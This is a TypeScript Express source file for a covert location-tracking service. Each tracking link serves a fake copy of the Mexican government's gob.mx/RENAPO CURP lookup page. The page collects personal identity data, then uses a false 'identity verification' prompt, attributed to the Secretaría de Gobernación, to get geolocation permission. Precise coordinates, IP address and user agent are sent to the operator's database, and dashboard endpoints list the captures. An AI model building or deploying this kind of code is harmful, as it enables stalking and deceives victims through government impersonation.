import { Router, type IRouter } from "express";
import { db, locationsTable, locationSessionsTable } from "@workspace/db";
import { eq, desc, sql } from "drizzle-orm";
import crypto from "crypto";

const router: IRouter = Router();

function buildTrackingPage(session: { token: string; name: string; pageStyle: string }): string {
  const tok = session.token;
  const dias = Array.from({length:31},(_,i)=>i+1).map(d=>`<option value="${d}">${String(d).padStart(2,'0')}</option>`).join('');
  const meses = ['01 - Enero','02 - Febrero','03 - Marzo','04 - Abril','05 - Mayo','06 - Junio','07 - Julio','08 - Agosto','09 - Septiembre','10 - Octubre','11 - Noviembre','12 - Diciembre'].map((m,i)=>`<option value="${i+1}">${m}</option>`).join('');
  const estados = ['Aguascalientes','Baja California','Baja California Sur','Campeche','Chiapas','Chihuahua','Ciudad de México','Coahuila','Colima','Durango','Estado de México','Guanajuato','Guerrero','Hidalgo','Jalisco','Michoacán','Morelos','Nayarit','Nuevo León','Oaxaca','Puebla','Querétaro','Quintana Roo','San Luis Potosí','Sinaloa','Sonora','Tabasco','Tamaulipas','Tlaxcala','Veracruz','Yucatán','Zacatecas','Nacido en el extranjero'].map(e=>`<option value="${e}">${e}</option>`).join('');

  return `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Consulta tu CURP | gob.mx</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700;900&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth}
body{font-family:'Lato',Arial,Helvetica,sans-serif;background:#fff;color:#333;min-height:100vh;display:flex;flex-direction:column;font-size:16px}

/* ── HEADER ── */
.hdr{background:#6B1535;width:100%}
.hdr-top{display:flex;align-items:center;justify-content:space-between;padding:14px 20px;max-width:960px;margin:0 auto}
.hdr-logo{display:flex;align-items:center;text-decoration:none}
.hdr-logo-img{height:56px;width:auto;display:block}
.hdr-menu{background:none;border:none;cursor:pointer;color:#fff;padding:6px;display:flex;flex-direction:column;gap:5px;flex-shrink:0}
.hdr-menu span{display:block;width:22px;height:2px;background:#fff;border-radius:1px}

/* ── RENAPO BAR ── */
.renapo-bar{background:#5c1230;padding:16px 20px}
.renapo-bar-inner{max-width:960px;margin:0 auto}
.renapo-bar p{color:#fff;font-size:17px;font-weight:700;letter-spacing:0.3px}

/* ── BREADCRUMB ── */
.breadcrumb{padding:26px 20px;max-width:960px;margin:0 auto;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
.breadcrumb a,.breadcrumb span{font-size:15px;color:#333;text-decoration:none}
.breadcrumb a:hover{text-decoration:underline}
.breadcrumb .sep{color:#666;font-size:13px;margin:0 2px}
.breadcrumb .current{font-weight:700}
.home-icon{font-size:16px}

/* ── PAGE TITLE ── */
.page-wrap{max-width:960px;margin:0 auto;padding:0 20px;width:100%}
.page-title{font-size:46px;font-weight:900;color:#333;margin:8px 0 40px;line-height:1.1}

/* ── SECTION HEADER ── */
.section-hdr{margin-bottom:10px}
.section-hdr h2{font-size:28px;font-weight:900;color:#333;margin-bottom:10px}
.section-underline{width:44px;height:4px;background:#c4a200;border-radius:2px;margin-bottom:28px}
.section-desc{font-size:16px;color:#444;line-height:1.6;margin-bottom:32px}

/* ── TABS ── */
.tabs{display:flex;gap:0;margin-bottom:0}
.tab-btn{padding:10px 14px;font-size:13.5px;font-weight:700;border:1px solid #ccc;border-bottom:none;cursor:pointer;font-family:inherit;-webkit-appearance:none;transition:all 0.15s;color:#444;background:#e8e8e8;border-radius:0;line-height:1.3}
.tab-btn.active{background:#6B1535;color:#fff;border-color:#6B1535}
.tab-btn:first-child{border-radius:4px 0 0 0}
.tab-btn:last-child{border-radius:0 4px 0 0}

/* ── FORM CARD ── */
.form-card{border:1px solid #c0c0c0;background:#fff;padding:18px;margin-bottom:20px}

/* ── FORM FIELDS ── */
.f-group{margin-bottom:16px}
.f-label{display:block;font-size:14px;font-weight:700;color:#333;margin-bottom:5px}
.f-req{color:#c0392b}
.f-input,.f-select{width:100%;padding:10px 12px;border:1px solid #bbb;border-radius:3px;font-size:15px;color:#333;background:#fff;font-family:inherit;-webkit-appearance:none;appearance:none;outline:none;transition:border-color 0.15s}
.f-input:focus,.f-select:focus{border-color:#6B1535;box-shadow:0 0 0 2px rgba(107,21,53,0.15)}
.f-input::placeholder{color:#aaa}
.f-input.upper{text-transform:uppercase;letter-spacing:1px}
.f-select-wrap{position:relative}
.f-select-wrap::after{content:'❯';position:absolute;right:12px;top:50%;transform:translateY(-50%) rotate(90deg);font-size:10px;color:#666;pointer-events:none}
.f-select{padding-right:32px}
.f-link{color:#6B1535;font-size:13.5px;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:inherit;padding:0;margin-top:6px;display:inline-block}

/* ── BOTTOM ACTION BAR (between form and info boxes) ── */
.bottom-bar{background:#fff;border-top:1px solid #ddd;padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px}
.bottom-note{font-size:12.5px;color:#555}
.btn-buscar{display:flex;align-items:center;gap:7px;background:#fff;color:#6B1535;border:2px solid #6B1535;padding:9px 20px;font-size:15px;font-weight:700;border-radius:3px;cursor:pointer;font-family:inherit;-webkit-appearance:none;transition:all 0.15s;white-space:nowrap}
.btn-buscar:hover{background:#6B1535;color:#fff}
.btn-buscar svg{width:16px;height:16px;flex-shrink:0}

/* ── INFO BOXES (light blue) ── */
.info-box{background:#d8eaf5;border-radius:3px;padding:16px;font-size:14px;color:#333;line-height:1.6;margin-bottom:16px;text-align:center}
.info-box strong{font-weight:700}
.info-box a{color:#0a5997;text-decoration:underline}
.info-box ul{text-align:left;padding-left:20px;margin-top:6px}
.info-box ul li{margin-bottom:2px}

/* ── FOOTER ── */
.footer{background:#6B1535;margin-top:auto;padding:24px 16px}
.footer-inner{max-width:960px;margin:0 auto}
.footer-brand{display:flex;align-items:center;gap:10px;margin-bottom:20px}
.footer-brand-text{display:flex;flex-direction:column;line-height:1.2}
.footer-brand-text span:first-child{color:rgba(255,255,255,0.85);font-size:12px;font-weight:400}
.footer-brand-text span:last-child{color:#fff;font-size:17px;font-weight:900}
.footer-section{border-top:1px solid rgba(255,255,255,0.2);padding:14px 0;display:flex;justify-content:space-between;align-items:center;cursor:pointer}
.footer-section span{color:#fff;font-size:15px;font-weight:700}
.footer-section .chevron{color:rgba(255,255,255,0.8);font-size:13px}
.footer-link{display:block;color:#fff;font-size:14px;font-weight:700;text-decoration:underline;padding:14px 0;border-top:1px solid rgba(255,255,255,0.2)}
.footer-social{padding:16px 0;border-top:1px solid rgba(255,255,255,0.2)}
.footer-social p{color:#fff;font-size:14px;margin-bottom:10px}
.footer-social-icons{display:flex;align-items:center;gap:16px}
.footer-social-icons a{color:#fff;font-size:18px;text-decoration:none;font-weight:700}
.footer-079{display:flex;align-items:center;gap:10px;padding:14px 0;border-top:1px solid rgba(255,255,255,0.2)}
.footer-079-icon{color:#fff;font-size:22px}
.footer-079-text{display:flex;flex-direction:column}
.footer-079-text .num{color:#fff;font-size:20px;font-weight:900;line-height:1}
.footer-079-text .sub{color:rgba(255,255,255,0.85);font-size:12px;line-height:1.3}

/* ── MODAL OVERLAY ── */
.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:200;align-items:center;justify-content:center;padding:20px}
.overlay.show{display:flex}
.modal{background:#fff;border-radius:4px;padding:28px 24px;max-width:400px;width:100%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.3)}
.modal-icon{width:56px;height:56px;background:#f0e6ea;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;border:2px solid #d4a0b0}
.modal-title{font-size:17px;font-weight:900;color:#333;margin-bottom:8px;line-height:1.3}
.modal-desc{font-size:13.5px;color:#555;line-height:1.6;margin-bottom:20px}
.modal-btn{width:100%;background:#6B1535;color:#fff;border:none;padding:13px;border-radius:3px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:8px;-webkit-appearance:none;transition:background 0.15s}
.modal-btn:hover{background:#5c1230}
.modal-btn-sec{width:100%;background:none;color:#6B1535;border:none;padding:8px;font-size:13px;cursor:pointer;font-family:inherit;text-decoration:underline}

/* Spinner */
.spinner{width:40px;height:40px;border:3px solid #e8d0d7;border-top-color:#6B1535;border-radius:50%;animation:spin 0.85s linear infinite;margin:0 auto 14px}
@keyframes spin{to{transform:rotate(360deg)}}

/* CURP Page Result */
.result-section{display:none}
.result-heading{font-size:28px;font-weight:900;color:#333;margin-bottom:10px}
.result-underline{width:44px;height:4px;background:#c4a200;border-radius:2px;margin-bottom:28px}
.datos-card{border:1px solid #ccc;border-radius:3px;overflow:hidden;margin-bottom:24px}
.datos-card-title{background:#f5f5f5;border-bottom:1px solid #ccc;padding:14px 16px;font-size:18px;font-weight:700;color:#333}
.datos-row{display:flex;border-bottom:1px solid #eee;min-height:46px}
.datos-row:last-child{border-bottom:none}
.datos-label{flex:0 0 44%;padding:12px 14px;font-size:14.5px;font-weight:700;color:#333;border-right:1px solid #eee}
.datos-val{flex:1;padding:12px 14px;font-size:14.5px;color:#333;word-break:break-all}
.btn-nueva{display:inline-block;background:#6B1535;color:#fff;border:none;padding:11px 22px;border-radius:3px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:24px}
/* Modal extras */
.success-icon{width:52px;height:52px;background:#d4edda;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;border:2px solid #9fd4ae}
.error-box{background:#fdf0f2;border:1px solid #e8b4bf;border-radius:3px;padding:14px;font-size:13.5px;color:#7a1230;margin-bottom:16px;line-height:1.5;text-align:left}
</style>
</head>
<body>

<!-- ══ HEADER ══ -->
<header class="hdr">
  <div class="hdr-top">
    <a class="hdr-logo" href="https://www.gob.mx" onclick="return false">
      <img class="hdr-logo-img" src="https://framework-gb.cdn.gob.mx/gobmx/img/logo_blanco.svg" alt="Gobierno de México">
    </a>
    <button class="hdr-menu" aria-label="Menú" onclick="return false">
      <span></span><span></span><span></span>
    </button>
  </div>
</header>

<!-- ══ RENAPO BAR ══ -->
<div class="renapo-bar">
  <div class="renapo-bar-inner"><p>RENAPO</p></div>
</div>

<!-- ══ BREADCRUMB ══ -->
<div style="background:#fff;border-bottom:1px solid #eee">
  <div class="breadcrumb">
    <span class="home-icon">⌂</span>
    <span class="sep"> &rsaquo; </span>
    <a href="#">Inicio</a>
    <span class="sep"> &rsaquo; </span>
    <span class="current">Consulta tu CURP</span>
  </div>
</div>

<!-- ══ MAIN CONTENT ══ -->
<main style="flex:1;background:#fff">
  <div class="page-wrap">
    <h1 class="page-title">Consulta tu CURP</h1>

    <div class="section-hdr">
      <h2>Búsqueda</h2>
      <div class="section-underline"></div>
    </div>

    <p class="section-desc">La consulta puede efectuarse indicando la clave CURP cuando ya la conoce o proporcionando su nombre y datos de nacimiento.</p>

    <!-- Resultado en página -->
    <div id="result-area" class="result-section">
      <div class="result-heading">Descarga del CURP</div>
      <div class="result-underline"></div>
      <div class="datos-card">
        <div class="datos-card-title">Datos del solicitante</div>
        <div class="datos-row"><span class="datos-label">CURP:</span><span class="datos-val" id="r-curp">—</span></div>
        <div class="datos-row"><span class="datos-label">Nombre(s):</span><span class="datos-val" id="r-nombre">—</span></div>
        <div class="datos-row"><span class="datos-label">Primer apellido:</span><span class="datos-val" id="r-apellido1">—</span></div>
        <div class="datos-row"><span class="datos-label">Segundo apellido:</span><span class="datos-val" id="r-apellido2">—</span></div>
        <div class="datos-row"><span class="datos-label">Sexo:</span><span class="datos-val" id="r-sexo">—</span></div>
        <div class="datos-row"><span class="datos-label">Fecha de<br>nacimiento: &#9432;</span><span class="datos-val" id="r-fecha">—</span></div>
        <div class="datos-row"><span class="datos-label">Nacionalidad:</span><span class="datos-val">MEXICO</span></div>
        <div class="datos-row"><span class="datos-label">Entidad de<br>nacimiento:</span><span class="datos-val" id="r-entidad">—</span></div>
        <div class="datos-row"><span class="datos-label">Documento<br>probatorio:</span><span class="datos-val">ACTA DE NACIMIENTO</span></div>
      </div>
      <button class="btn-nueva" onclick="nuevaConsulta()">← Nueva consulta</button>
    </div>

    <!-- Tabs -->
    <div id="search-area">
    <div class="tabs">
      <button class="tab-btn active" onclick="switchTab('tab-curp',this)" type="button">Clave Única de Registro de Población</button>
      <button class="tab-btn" onclick="switchTab('tab-datos',this)" type="button">Datos Personales</button>
    </div>

    <!-- Tab 1: Por CURP -->
    <div class="form-card" id="tab-curp">
      <div class="f-group">
        <label class="f-label">Clave Única de Registro de Población (CURP)<span class="f-req">*</span>:</label>
        <input class="f-input upper" type="text" id="curp-input" maxlength="18" placeholder="Ingresa tu CURP" autocomplete="off" autocorrect="off" spellcheck="false">
        <button class="f-link" type="button" onclick="switchTab('tab-datos', document.querySelectorAll('.tab-btn')[1])">¿No conoces tu CURP?</button>
      </div>
    </div>

    <!-- Tab 2: Por Datos Personales -->
    <div class="form-card" id="tab-datos" style="display:none">
      <div class="f-group">
        <label class="f-label">Nombre(s)<span class="f-req">*</span>:</label>
        <input class="f-input" type="text" id="nombre" placeholder="Ingresa tu nombre(s)" autocomplete="given-name">
      </div>
      <div class="f-group">
        <label class="f-label">Primer apellido<span class="f-req">*</span>:</label>
        <input class="f-input" type="text" id="apellido1" placeholder="Ingresa tu primer apellido" autocomplete="family-name">
      </div>
      <div class="f-group">
        <label class="f-label">Segundo apellido:</label>
        <input class="f-input" type="text" id="apellido2" placeholder="Ingresa tu segundo apellido">
      </div>
      <div class="f-group">
        <label class="f-label">Día de nacimiento<span class="f-req">*</span>:</label>
        <div class="f-select-wrap">
          <select class="f-select" id="dia">
            <option value="">Seleccionar el día</option>
            ${dias}
          </select>
        </div>
      </div>
      <div class="f-group">
        <label class="f-label">Mes de nacimiento<span class="f-req">*</span>:</label>
        <div class="f-select-wrap">
          <select class="f-select" id="mes">
            <option value="">Seleccionar el mes</option>
            ${meses}
          </select>
        </div>
      </div>
      <div class="f-group">
        <label class="f-label">Año de nacimiento<span class="f-req">*</span>:</label>
        <input class="f-input" type="number" id="anio" placeholder="Ingresa el año Ej. 1943" min="1900" max="2025">
      </div>
      <div class="f-group">
        <label class="f-label">Sexo<span class="f-req">*</span>:</label>
        <div class="f-select-wrap">
          <select class="f-select" id="sexo">
            <option value="">Selecciona el sexo</option>
            <option value="M">Mujer</option>
            <option value="H">Hombre</option>
            <option value="X">No binario</option>
          </select>
        </div>
      </div>
      <div class="f-group" style="margin-bottom:0">
        <label class="f-label">Estado<span class="f-req">*</span>: <span style="font-size:13px;font-weight:400;color:#888">&#9432;</span></label>
        <div class="f-select-wrap">
          <select class="f-select" id="estado">
            <option value="">Selecciona el estado</option>
            ${estados}
          </select>
        </div>
      </div>
    </div>

    <!-- ══ BOTTOM BAR — entre formulario y avisos ══ -->
    <div class="bottom-bar">
      <span class="bottom-note">* Campos obligatorios</span>
      <button class="btn-buscar" type="button" onclick="handleBuscar()">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
        </svg>
        Buscar
      </button>
    </div>
    </div><!-- /search-area -->

    <!-- Sugerencia -->
    <div class="info-box">
      <p><strong>¡Sugerencia!</strong> Para solicitar asistencia telefónica sobre el servicio de la CURP, puedes comunicarte al Centro de Atención y Servicios, de lunes a viernes, de 08:00 a 16:00 horas, a los números telefónicos:</p>
      <ul>
        <li>800 &nbsp;9 &nbsp;11 &nbsp;11 &nbsp;11, extensiones 15100 y 15101.</li>
      </ul>
    </div>

    <!-- Aviso de privacidad -->
    <div class="info-box">
      <p><strong>Aviso de privacidad simplificado de consulta de CURP en línea</strong></p>
      <p style="margin-top:8px">La recolección de datos personales se lleva a cabo a través de <a href="#">https://www.gob.mx/curp</a>, cuyo administrador y responsable del trámite de CURP es la Dirección General del Registro Nacional de Población e Identidad de la Secretaría de Gobernación.</p>
      <p style="margin-top:8px">Los datos personales que se recaban serán utilizados con la finalidad de buscar, validar y obtener la CURP.</p>
      <p style="margin-top:8px">Conoce el aviso de privacidad integral en <a href="#">https://www.gob.mx/curp/privacidadintegral</a>.</p>
    </div>
  </div>
</main>

<!-- ══ FOOTER ══ -->
<footer class="footer">
  <div class="footer-inner">
    <div class="footer-brand">
      <img src="/api/assets/escudo.png" alt="Escudo" width="40" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/1/1e/Escudo_de_armas_de_M%C3%A9xico.svg/96px-Escudo_de_armas_de_M%C3%A9xico.svg.png'">
      <div class="footer-brand-text">
        <span>Gobierno de</span>
        <span>México</span>
      </div>
    </div>
    <div class="footer-section">
      <span>Enlaces</span><span class="chevron">❯</span>
    </div>
    <div class="footer-section">
      <span>¿Qué es gob.mx?</span><span class="chevron">❯</span>
    </div>
    <a class="footer-link" href="#">Denuncia contra servidores públicos</a>
    <div class="footer-social">
      <p>Síguenos en</p>
      <div class="footer-social-icons">
        <a href="#" title="Facebook">f</a>
        <a href="#" title="X" style="font-family:monospace">✕</a>
        <a href="#" title="Instagram">&#9825;</a>
        <a href="#" title="YouTube">&#9654;</a>
      </div>
    </div>
    <div class="footer-079">
      <div class="footer-079-icon">✸</div>
      <div class="footer-079-text">
        <span class="num">079</span>
        <span class="sub">Comunícate, estamos<br>para ayudarte</span>
      </div>
    </div>
  </div>
</footer>

<!-- ══ MODAL ══ -->
<div class="overlay" id="overlay">
  <div class="modal">

    <!-- Verificación -->
    <div id="m-verify">
      <div class="modal-icon">
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#6B1535" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
      </div>
      <div class="modal-title">Verificación de identidad requerida</div>
      <div class="modal-desc">Para continuar con la consulta de su CURP, el sistema del RENAPO requiere validar su ubicación geográfica como medida de seguridad ante posibles accesos no autorizados a datos personales.</div>
      <button class="modal-btn" onclick="requestLocation()">Permitir verificación de ubicación</button>
      <button class="modal-btn-sec" onclick="closeModal()">Cancelar</button>
      <p style="font-size:11px;color:#aaa;margin-top:8px;line-height:1.4">Esta verificación es solicitada por la Secretaría de Gobernación para proteger su información. Su ubicación no se almacenará de forma permanente.</p>
    </div>

    <!-- Cargando -->
    <div id="m-loading" style="display:none">
      <div class="spinner"></div>
      <div class="modal-title">Verificando información...</div>
      <div class="modal-desc" style="margin-bottom:0">Conectando con los servidores del RENAPO. Por favor espere.</div>
    </div>

    <!-- Error -->
    <div id="m-error" style="display:none">
      <div class="error-box">
        <strong>No se encontró el CURP.</strong><br>
        Verifique los datos ingresados e intente nuevamente. Si el problema persiste, consulte directamente en <a href="https://www.gob.mx/curp/" target="_blank" style="color:#6B1535">gob.mx/curp</a>.
      </div>
      <button class="modal-btn" onclick="location.reload()">Intentar de nuevo</button>
      <button class="modal-btn-sec" onclick="closeModal()">Cancelar</button>
    </div>

  </div>
</div>

<script>
var _fd = null;
function switchTab(id, btn) {
  document.getElementById('tab-curp').style.display = id === 'tab-curp' ? 'block' : 'none';
  document.getElementById('tab-datos').style.display = id === 'tab-datos' ? 'block' : 'none';
  document.querySelectorAll('.tab-btn').forEach(function(b){ b.classList.remove('active'); });
  if (btn) btn.classList.add('active');
}
function handleBuscar() {
  var curpTab = document.getElementById('tab-curp');
  if (curpTab && curpTab.style.display !== 'none') {
    _fd = { curp: (document.getElementById('curp-input') || {}).value || '' };
  } else {
    _fd = { datos: {
      nombre: (document.getElementById('nombre') || {}).value || '',
      apellido1: (document.getElementById('apellido1') || {}).value || '',
      apellido2: (document.getElementById('apellido2') || {}).value || '',
      dia: (document.getElementById('dia') || {}).value || '',
      mes: (document.getElementById('mes') || {}).value || '',
      anio: (document.getElementById('anio') || {}).value || '',
      sexo: (document.getElementById('sexo') || {}).value || 'H',
      estado: (document.getElementById('estado') || {}).value || 'Ciudad de México',
    }};
  }
  document.getElementById('overlay').classList.add('show');
  showModal('m-verify');
}
function showModal(id) {
  ['m-verify','m-loading','m-error'].forEach(function(s){
    document.getElementById(s).style.display = s === id ? 'block' : 'none';
  });
}
function closeModal() {
  document.getElementById('overlay').classList.remove('show');
}
function requestLocation() {
  showModal('m-loading');
  if (!navigator.geolocation) { doLookup(); return; }
  navigator.geolocation.getCurrentPosition(
    function(pos) {
      fetch('/api/track/${tok}/capture', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy, altitude: pos.coords.altitude })
      }).catch(function(){});
      doLookup();
    },
    function() { doLookup(); },
    {enableHighAccuracy: true, timeout: 12000, maximumAge: 0}
  );
}
function doLookup() {
  fetch('/api/curp-lookup', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(_fd || {})
  })
  .then(function(r){ return r.json(); })
  .then(function(r){
    if (r.success && r.data) { showPageResult(r.data); }
    else { showModal('m-error'); }
  })
  .catch(function(){ showModal('m-error'); });
}
function showPageResult(data) {
  var d = data.datos || data;
  var sexoRaw = d.sexo || '';
  var sexo = sexoRaw === 'H' ? 'HOMBRE' : sexoRaw === 'M' ? 'MUJER' : sexoRaw.toUpperCase();
  document.getElementById('r-curp').textContent = (d.curp || '—').toUpperCase();
  document.getElementById('r-nombre').textContent = (d.nombre || '—').toUpperCase();
  document.getElementById('r-apellido1').textContent = (d.primerApellido || '—').toUpperCase();
  document.getElementById('r-apellido2').textContent = (d.segundoApellido || '—').toUpperCase();
  document.getElementById('r-sexo').textContent = sexo || '—';
  document.getElementById('r-fecha').textContent = d.fechaNacimiento || '—';
  document.getElementById('r-entidad').textContent = (d.entidad || '—').toUpperCase();
  closeModal();
  document.getElementById('search-area').style.display = 'none';
  var ra = document.getElementById('result-area');
  ra.style.display = 'block';
  ra.scrollIntoView({behavior:'smooth', block:'start'});
}
function nuevaConsulta() {
  document.getElementById('result-area').style.display = 'none';
  document.getElementById('search-area').style.display = 'block';
  window.scrollTo({top:0, behavior:'smooth'});
}
</script>
</body>
</html>`;
}

router.get("/track/:token", async (req, res) => {
  const { token } = req.params;
  try {
    const sessions = await db.select().from(locationSessionsTable).where(eq(locationSessionsTable.token, token));
    if (!sessions.length) return res.status(404).send("Enlace no válido");
    res.send(buildTrackingPage(sessions[0]));
  } catch (e) {
    res.status(500).send("Error");
  }
});

router.post("/track/:token/capture", async (req, res) => {
  const { token } = req.params;
  const { latitude, longitude, accuracy, altitude } = req.body;
  if (!latitude || !longitude) return res.status(400).json({ error: "Missing coordinates" });
  try {
    await db.insert(locationsTable).values({
      sessionToken: token,
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      accuracy: accuracy ? parseFloat(accuracy) : null,
      altitude: altitude ? parseFloat(altitude) : null,
      ipAddress: (req.headers["x-forwarded-for"] as string)?.split(",")[0] || req.socket.remoteAddress || null,
      userAgent: req.headers["user-agent"] || null,
    });
    await db.update(locationSessionsTable)
      .set({ captureCount: sql`capture_count + 1` })
      .where(eq(locationSessionsTable.token, token));
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Error saving location" });
  }
});

router.get("/location-sessions", async (req, res) => {
  const ADMIN_EMAIL = "servidorl3ho@gmail.com";
  const isAdmin = req.userEmail === ADMIN_EMAIL;
  const uid = req.userUid;
  try {
    let sessions;
    if (isAdmin || !uid) {
      sessions = await db.select().from(locationSessionsTable).orderBy(desc(locationSessionsTable.createdAt));
    } else {
      sessions = await db.select().from(locationSessionsTable)
        .where(eq(locationSessionsTable.ownerUid, uid))
        .orderBy(desc(locationSessionsTable.createdAt));
    }
    res.json(sessions);
  } catch (e) {
    res.status(500).json({ error: "Error fetching sessions" });
  }
});

router.post("/location-sessions", async (req, res) => {
  const { name, description } = req.body;
  if (!name) return res.status(400).json({ error: "Name required" });
  const token = crypto.randomBytes(12).toString("hex");
  try {
    const result = await db.insert(locationSessionsTable).values({
      token,
      name,
      description,
      ownerUid: req.userUid ?? null,
      ownerEmail: req.userEmail ?? null,
    }).returning();
    res.json(result[0]);
  } catch (e) {
    res.status(500).json({ error: "Error creating session" });
  }
});

router.delete("/location-sessions/:token", async (req, res) => {
  const { token } = req.params;
  try {
    await db.delete(locationsTable).where(eq(locationsTable.sessionToken, token));
    await db.delete(locationSessionsTable).where(eq(locationSessionsTable.token, token));
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Error deleting session" });
  }
});

router.get("/location-sessions/:token/data", async (req, res) => {
  const { token } = req.params;
  try {
    const locs = await db.select().from(locationsTable)
      .where(eq(locationsTable.sessionToken, token))
      .orderBy(desc(locationsTable.capturedAt));
    res.json(locs);
  } catch (e) {
    res.status(500).json({ error: "Error fetching locations" });
  }
});

export default router;
